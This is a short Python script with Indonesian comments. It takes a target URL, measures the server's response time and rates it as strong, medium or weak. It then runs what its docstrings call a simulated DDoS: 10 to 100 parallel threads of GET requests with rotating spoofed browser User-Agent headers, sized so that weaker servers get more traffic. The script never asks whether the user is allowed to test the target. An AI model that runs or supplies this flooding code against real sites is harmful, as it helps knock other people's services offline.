import requests
import time
import threading
import random

def ping_server(target_url):
    """Fungsi untuk mengukur waktu respons server"""
    try:
        start_time = time.time()
        response = requests.get(target_url)
        response_time = time.time() - start_time
        return response_time
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None

def test_server_capacity(target_url, num_requests=100):
    """Tes seberapa banyak permintaan yang dapat ditangani server"""
    start_time = time.time()
    for _ in range(num_requests):
        requests.get(target_url)
    end_time = time.time()
    total_time = end_time - start_time
    return total_time / num_requests

def send_request(target_url):
    """Fungsi untuk mengirim request palsu (simulasi DDoS)"""
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        ])
    }
    try:
        response = requests.get(target_url, headers=headers)
        print(f"Request sent to {target_url}: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

def attack_server(target_url, num_requests):
    """Mengirim serangan DDoS simulasi dengan mengirim banyak request secara paralel"""
    threads = []
    for _ in range(num_requests):
        thread = threading.Thread(target=send_request, args=(target_url,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def scan_server(target_url):
    """Memindai kekuatan server berdasarkan latensi dan kapasitas"""
    print(f"Memindai server: {target_url}")

    response_time = ping_server(target_url)
    if response_time is None:
        print("Server tidak dapat dijangkau")
        return

    print(f"Waktu respons: {response_time:.4f} detik")

    if response_time < 1:
        print("Server Kuat")
    elif response_time < 2:
        print("Server Sedang")
    else:
        print("Server Lemah")

    avg_request_time = test_server_capacity(target_url)
    print(f"Rata-rata waktu untuk setiap permintaan: {avg_request_time:.4f} detik")

    if avg_request_time < 0.1:
        print("Server Kuat")
        attack_server(target_url, num_requests=10)
    elif avg_request_time < 0.5:
        print("Server Sedang")
        attack_server(target_url, num_requests=50)
    else:
        print("Server Lemah")
        attack_server(target_url, num_requests=100)

if __name__ == "__main__":
    target_url = input("Masukkan URL target untuk dipindai (contoh: https://example.com): ").strip()
    scan_server(target_url)
